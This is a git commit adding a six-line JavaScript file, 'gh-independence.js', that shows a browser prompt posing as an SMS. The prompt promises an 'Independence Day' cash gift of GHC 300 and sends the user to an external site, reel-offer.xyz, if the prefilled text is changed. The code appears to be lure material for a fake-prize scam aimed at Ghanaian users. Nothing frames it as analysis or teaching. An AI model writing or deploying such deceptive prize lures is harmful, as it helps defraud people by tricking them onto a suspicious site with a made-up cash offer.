5e3f88121546c3e0619580ebd2b35dddcd9f493f
bigetijazz17 <bigetijazz17@gmail.com>
2025-02-28 19:36:34 +0100

    Create gh-independence.js

---
+++ gh-independence.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW GHC 300'
+password=prompt('SMS: Congratulations, you are among the lucky people to benefit from INDEPENDENCE DAY offer. Click OK to withdraw cash gift.','WITHDRAW GHC 300');
+if (password != 'WITHDRAW GHC 300') {
+location.href='https://www.reel-offer.xyz/withdraw-ghc300';
+}
